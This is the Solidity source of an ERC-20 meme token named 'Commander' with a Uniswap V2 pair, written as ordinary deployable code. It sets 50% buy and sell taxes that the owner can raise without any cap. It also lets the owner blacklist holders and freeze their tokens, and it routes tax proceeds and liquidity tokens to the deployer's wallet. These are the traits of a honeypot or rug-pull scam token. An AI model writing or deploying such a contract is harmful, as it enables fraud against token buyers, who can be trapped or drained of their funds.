/**
 * Commander (COMMANDER) Joe Biden Dog
 */

// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner_,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner_,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner_) public virtual onlyOwner {
        require(
            newOwner_ != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner_);
        _owner = newOwner_;
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract COMMANDER is Context, IERC20, Ownable {
    using SafeMath for uint256;

    // Mappings for balances, allowances, and fee exclusions
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;

    // Blacklist mapping
    mapping(address => bool) private _isBlacklisted;

    // Address designated for collecting taxes
    address payable private _devWallet;

    // Tax rates for buy and sell transactions (expressed in percentages)
    uint256 private _buyTax = 50; // 50%
    uint256 private _sellTax = 50; // 50%

    bool private tradingOpen = false;

    // Token details
    string private constant _name = "Commander";
    string private constant _symbol = "COMMANDER";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100_000_000 * 10 ** _decimals; // Total supply: 100,000,000 tokens

    // Transaction limits
    uint256 public _maxBuyLimit = (_tTotal * 1) / 100; // 1% of total supply
    uint256 public _taxSwapThreshold = _tTotal / 100; // 1% of total supply
    uint256 public _maxTaxSwap = _tTotal / 10; // 10% of total supply

    // Uniswap router and pair addresses
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    // Flags for swap mechanics
    bool private inSwap = false;
    bool private swapEnabled = false;

    // Events
    event MaxBuyLimitUpdated(uint256 _maxBuyLimit);
    event Blacklisted(address indexed account);
    event RemovedFromBlacklist(address indexed account);
    event TaxUpdated(uint256 newBuyTax, uint256 newSellTax);

    /**
     * @dev Modifier to prevent re-entrancy during token swaps.
     */
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    /**
     * @dev Initializes the contract by setting the deployer as the dev wallet,
     * assigning the total supply to the deployer, excluding certain addresses from fees,
     * and creating a Uniswap pair for the token.
     */
    constructor() {
        _devWallet = payable(msg.sender); // Set the deployer as the dev wallet
        _balances[_msgSender()] = _tTotal; // Assign total supply to the deployer

        // Exclude owner, contract, and dev wallet from fees
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_devWallet] = true;

        // Initialize Uniswap Router (Uniswap V2 Router address)
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        // Create a Uniswap pair for this token and WETH
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        emit Transfer(address(0), _msgSender(), _tTotal); // Emit transfer event from zero address to deployer
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public pure returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals the token uses.
     */
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     * Returns the total supply of tokens.
     */
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     * Returns the balance of the specified `account`.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     * Transfers `amount` tokens from the caller's account to `recipient`.
     * Applies dynamic taxes and transaction limits based on trading status.
     */
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     * Returns the remaining number of tokens that `spender` can spend on behalf of `owner_`.
     */
    function allowance(
        address owner_,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner_][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     * Allows `spender` to spend up to `amount` tokens on behalf of the caller.
     */
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     * Transfers `amount` tokens from `sender` to `recipient` using the allowance mechanism.
     * Updates the allowance accordingly.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner_`'s tokens.
     * Emits an {Approval} event.
     */
    function _approve(address owner_, address spender, uint256 amount) private {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    /**
     * @dev Handles token transfers, applying dynamic taxes, enforcing transaction limits,
     * and managing blacklist restrictions.
     * Also manages swapping tokens for ETH and sending ETH to the dev wallet when thresholds are met.
     */
    function _transfer(address from, address to, uint256 amount) private {
        // Basic transfer validations
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        // Blacklist checks
        require(!_isBlacklisted[from], "Sender is blacklisted");
        require(!_isBlacklisted[to], "Recipient is blacklisted");

        uint256 taxAmount = 0; // Initialize tax amount

        // Check if fees should be applied
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            // Ensure trading is open
            require(tradingOpen, "Trading is not active.");

            // Apply max buy limit for buy transactions
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxBuyLimit, "Exceeds the _maxBuyLimit.");
                // Buy transaction tax
                taxAmount = amount.mul(_buyTax).div(100);
            }

            // Apply tax for sell transactions
            if (to == uniswapV2Pair) {
                taxAmount = amount.mul(_sellTax).div(100);
            }

            // Handle swapping tokens for ETH if conditions are met
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                contractTokenBalance >= _taxSwapThreshold
            ) {
                uint256 tokensToSwap = _taxSwapThreshold > _maxTaxSwap
                    ? _maxTaxSwap
                    : _taxSwapThreshold;
                swapTokensForEth(tokensToSwap);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendEthToDevWallet(contractETHBalance);
                }
            }
        }

        // Override tax if sender or recipient is excluded from fees or if not a buy/sell transaction
        if (
            _isExcludedFromFee[from] ||
            _isExcludedFromFee[to] ||
            (from != uniswapV2Pair && to != uniswapV2Pair)
        ) {
            taxAmount = 0;
        }

        // Transfer tax to the contract
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        // Perform the actual token transfer
        _balances[from] = _balances[from].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    /**
     * @dev Swaps a specified amount of tokens for ETH using Uniswap.
     * The swapped ETH is sent to the contract's address.
     * @param tokenAmount The amount of tokens to swap for ETH.
     */
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        // Generate the Uniswap pair path of token -> WETH
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        // Approve the router to spend the tokens
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // Execute the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // Accept any amount of ETH
            path,
            address(this), // Tokens swapped for ETH are sent to this contract
            block.timestamp
        );
    }

    /**
     * @dev Adds liquidity to Uniswap by pairing the token with ETH.
     * Can only be called by the contract owner.
     * Requires that trading is not already open and that the contract holds enough tokens.
     */
    function addLiquidity() external onlyOwner {
        require(!tradingOpen, "Trading is already open");

        uint256 tokenAmount = 100_000_000 * 10 ** _decimals; // 100,000,000 COMMANDER

        // Ensure the contract has enough tokens to add as liquidity
        require(
            balanceOf(address(this)) >= tokenAmount,
            "Insufficient token balance for liquidity"
        );

        // Approve the router to spend the tokens
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // Add the liquidity to Uniswap
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),      // Token address
            tokenAmount,        // Amount of tokens to add
            0,                  // Minimum amount of tokens to add (0 for no minimum)
            0,                  // Minimum amount of ETH to add (0 for no minimum)
            _devWallet,         // Recipient of the liquidity tokens
            block.timestamp     // Deadline timestamp
        );

        // Approve the Uniswap pair to spend an unlimited amount of its tokens
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    /**
     * @dev Opens trading by setting the `tradingOpen` flag to true.
     * Enables token swaps and applies trading restrictions based on the number of blocks since trading opened.
     * Can only be called by the contract owner.
     */
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        tradingOpen = true;
        swapEnabled = true;
    }

    /**
     * @dev Sends a specified amount of ETH to the designated dev wallet.
     * @param amountToSend The amount of ETH to send.
     */
    function sendEthToDevWallet(uint256 amountToSend) private {
        _devWallet.transfer(amountToSend);
    }

    /**
     * @dev Allows the contract owner to update the maximum buy limit at any time.
     * Emits a {MaxBuyLimitUpdated} event upon successful update.
     * @param maxBuyLimit The new maximum buy limit.
     */
    function updateMaxBuyLimit(uint256 maxBuyLimit) external onlyOwner {
        _maxBuyLimit = maxBuyLimit;
        emit MaxBuyLimitUpdated(_maxBuyLimit);
    }

    /**
     * @dev Allows the contract owner to set the buy tax.
     * Emits a {BuyTaxUpdated} event upon successful update.
     * @param newBuyTax The new buy tax percentage.
     */
    function setTax(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {
        _buyTax = newBuyTax;
        _sellTax = newSellTax;
        emit TaxUpdated(newBuyTax, newSellTax);
    }

    /**
     * @dev Allows the contract owner to exclude or include an account from transaction fees.
     * @param account The address to be excluded or included.
     * @param excluded A boolean indicating whether to exclude (`true`) or include (`false`) the account.
     */
    function setExcludedFromFee(
        address account,
        bool excluded
    ) external onlyOwner {
        _isExcludedFromFee[account] = excluded;
    }

    /**
     * @dev Allows the contract owner to add an address to the blacklist.
     * Prevents the address from sending or receiving tokens.
     * Emits a {Blacklisted} event.
     * @param account The address to blacklist.
     */
    function blacklistAddress(address account) external onlyOwner {
        require(!_isBlacklisted[account], "Address is already blacklisted");
        _isBlacklisted[account] = true;
        emit Blacklisted(account);
    }

    /**
     * @dev Allows the contract owner to remove an address from the blacklist.
     * Permits the address to send and receive tokens again.
     * Emits a {RemovedFromBlacklist} event.
     * @param account The address to remove from the blacklist.
     */
    function removeFromBlacklist(address account) external onlyOwner {
        require(_isBlacklisted[account], "Address is not blacklisted");
        _isBlacklisted[account] = false;
        emit RemovedFromBlacklist(account);
    }

    /**
     * @dev Checks if an address is blacklisted.
     * @param account The address to check.
     * @return A boolean indicating whether the address is blacklisted.
     */
    function isBlacklisted(address account) public view returns (bool) {
        return _isBlacklisted[account];
    }

    /**
     * @dev Allows the designated dev wallet to withdraw all tokens held by the contract.
     * Ensures that only the dev wallet can perform this action.
     */
    function tokensWithdraw() external {
        require(
            _msgSender() == _devWallet,
            "Only dev wallet can withdraw tokens"
        );
        uint256 amount = balanceOf(address(this));
        _transfer(address(this), _devWallet, amount);
    }

    /**
     * @dev Allows the contract to receive ETH directly.
     * This is necessary for receiving ETH from Uniswap swaps.
     */
    receive() external payable {}
}